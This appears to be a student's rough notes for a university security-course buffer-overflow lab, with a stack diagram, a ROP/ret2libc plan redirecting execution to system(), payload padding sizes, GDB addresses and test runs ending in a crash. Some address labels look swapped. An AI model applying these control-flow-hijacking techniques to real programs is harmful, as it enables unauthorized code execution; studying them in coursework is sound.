```
higher addr
####################################
rip#2: 0x5555555550c0 -> system(), rdi = (char *)command
####################################
to rdi: (char (*)[8]) 0x555555558010 <IlikeTOnameVARIABLESlikeTHIS> / 0x7fff ffff e8b0 text[64]
####################################
0x7fff ffff e948: rip -> rop: pop rdi, ret @ 0x555555555413
####################################
rbp somewhere here
####################################
0x7fff ffff e8f0: b[70]
####################################
0x7fff ffff e8b0: text[64]
####################################
a somewhere below.
####################################
lower addr
```

- `GDB peda` -> `ropgadget` -> `dumprop` for gadgets


working:
```
a * 64 + b * 70 + P * 10 + rbp(0x00000000ffffcd30)
```
```sh
a * 64 + b * 70 + P * 10 + rbp(0xffffcd30)
This is me --> xcne5
uid=43549(chang-ch) gid=140(soc) groups=140(soc)
^ the all and mighty powerful user
You want this power right?Too bad you can't :P


Talk back at me if you want :PPPP
rbp0 = 0x0000000000000000
rip1 = 0xFFFFFFB300007F60
rdi1 = 0xFFFFC62000007F60
rip2 = 0xFFB52808FFFFFFFF
```

```sh
chang-ch@xcne5:~/CS2107/impropercode$ ./ipgf < test.bin
This is me --> xcne5
uid=43549(chang-ch) gid=140(soc) groups=140(soc)
^ the all and mighty powerful user
You want this power right?Too bad you can't :P


Talk back at me if you want :PPPP
rbp0 = 0x0000000000000000
rip1 = 0xFFFFF00000007F71
rdi1 = 0xFFFF862000007F71
rip2 = 0xFFFFF148FFFFFFFE
This is me --> xcne5
uid=43549(chang-ch) gid=140(soc) groups=140(soc)
^ the all and mighty powerful user
You want this power right?Too bad you can't :P


Talk back at me if you want :PPPP
rbp0 = 0x0000000000000000
rip1 = 0xFFFFFFB300007F71
rdi1 = 0xFFFF862000007F71
rip2 = 0xFFFFF148FFFFFFFE
Segmentation fault (core dumped)
```


ret2libc;
$3 = {int (const char *)} 0x7ffff7e1d2c0 <__libc_system>
gdb-peda$ p exit
$4 = {void (int)} 0x7ffff7e11a70 <__GI_exit>




```
// objdump -D improper -M intel | grep puts
puts_got_addr = 0x401084
puts_plt_addr = 0x404018
main_plt_addr = 0x4011b6

```